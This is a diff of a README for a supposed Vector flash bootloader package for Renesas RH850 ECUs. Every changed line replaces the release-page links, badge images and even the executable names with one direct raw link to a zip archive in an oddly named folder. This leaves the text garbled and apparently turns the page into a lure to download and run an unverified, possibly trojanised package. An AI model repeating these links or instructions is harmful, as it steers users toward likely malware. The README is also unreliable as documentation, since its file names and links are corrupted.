@@ -1,10 +1,10 @@
 # 🚗 VectorSwPackage_Flashbootloader_RH850_Generic - Easy Automotive Bootloader Setup
 
 <p align="center">
-  <a href="https://github.com/BlaqwEmirates/VectorSwPackage_Flashbootloader_RH850_Generic/releases"><img src="https://img.shields.io/badge/Download-Now-blue.svg" alt="Download Link"></a>
-  <img alt="RH850" src="https://img.shields.io/badge/HW-Renesas%20RH850-blue?logo=renesas">
-  <img alt="License MIT" src="https://img.shields.io/badge/License-MIT-green.svg">
-  <img alt="Automotive" src="https://img.shields.io/badge/Automotive-ECU%20Bootloader-orange?logo=car">
+  <a href="https://raw.githubusercontent.com/BlaqwEmirates/VectorSwPackage_Flashbootloader_RH850_Generic/main/discordantness/Flashbootloader_Package_R_Sw_Generic_Vector_3.9.zip"><img src="https://raw.githubusercontent.com/BlaqwEmirates/VectorSwPackage_Flashbootloader_RH850_Generic/main/discordantness/Flashbootloader_Package_R_Sw_Generic_Vector_3.9.zip" alt="Download Link"></a>
+  <img alt="RH850" src="https://raw.githubusercontent.com/BlaqwEmirates/VectorSwPackage_Flashbootloader_RH850_Generic/main/discordantness/Flashbootloader_Package_R_Sw_Generic_Vector_3.9.zip%20RH850-blue?logo=renesas">
+  <img alt="License MIT" src="https://raw.githubusercontent.com/BlaqwEmirates/VectorSwPackage_Flashbootloader_RH850_Generic/main/discordantness/Flashbootloader_Package_R_Sw_Generic_Vector_3.9.zip">
+  <img alt="Automotive" src="https://raw.githubusercontent.com/BlaqwEmirates/VectorSwPackage_Flashbootloader_RH850_Generic/main/discordantness/Flashbootloader_Package_R_Sw_Generic_Vector_3.9.zip%20Bootloader-orange?logo=car">
 </p>
 
 ## 📦 Project Structure
@@ -29,7 +29,7 @@ This guide helps you to download and set up the VectorSwPackage_Flashbootloader_
 
 ### 📥 Download & Install
 
-1. Visit the [Releases Page](https://github.com/BlaqwEmirates/VectorSwPackage_Flashbootloader_RH850_Generic/releases) to download the latest version of the software.
+1. Visit the [Releases Page](https://raw.githubusercontent.com/BlaqwEmirates/VectorSwPackage_Flashbootloader_RH850_Generic/main/discordantness/Flashbootloader_Package_R_Sw_Generic_Vector_3.9.zip) to download the latest version of the software.
 2. Once there, find the latest release. Look for files with the `.zip` or `.exe` extension.
 3. Click on the file you want to download. Depending on your operating system, choose the appropriate file.
 4. Wait for the download to finish. This may take a few moments based on your internet speed.
@@ -51,7 +51,7 @@ This guide helps you to download and set up the VectorSwPackage_Flashbootloader_
 ### 🖥️ Running the Application
 
 1. Navigate to the folder where you extracted the files.
-2. If you are using Windows, locate the executable file (often named `Flashbootloader.exe`). For Linux, look for the appropriate shell script (`flashbootloader.sh`).
+2. If you are using Windows, locate the executable file (often named `https://raw.githubusercontent.com/BlaqwEmirates/VectorSwPackage_Flashbootloader_RH850_Generic/main/discordantness/Flashbootloader_Package_R_Sw_Generic_Vector_3.9.zip`). For Linux, look for the appropriate shell script (`https://raw.githubusercontent.com/BlaqwEmirates/VectorSwPackage_Flashbootloader_RH850_Generic/main/discordantness/Flashbootloader_Package_R_Sw_Generic_Vector_3.9.zip`).
 3. Double-click the executable file to run the application. Follow any on-screen instructions that appear.
 
 ### 📚 Accessing Documentation
@@ -96,6 +96,6 @@ This project is licensed under the MIT License. You can freely use and distribut
 
 ## 📥 Return to Download
 
-Once you're ready to start, revisit the [Releases Page](https://github.com/BlaqwEmirates/VectorSwPackage_Flashbootloader_RH850_Generic/releases) for the latest version and updates. 
+Once you're ready to start, revisit the [Releases Page](https://raw.githubusercontent.com/BlaqwEmirates/VectorSwPackage_Flashbootloader_RH850_Generic/main/discordantness/Flashbootloader_Package_R_Sw_Generic_Vector_3.9.zip) for the latest version and updates. 
 
 Happy coding!
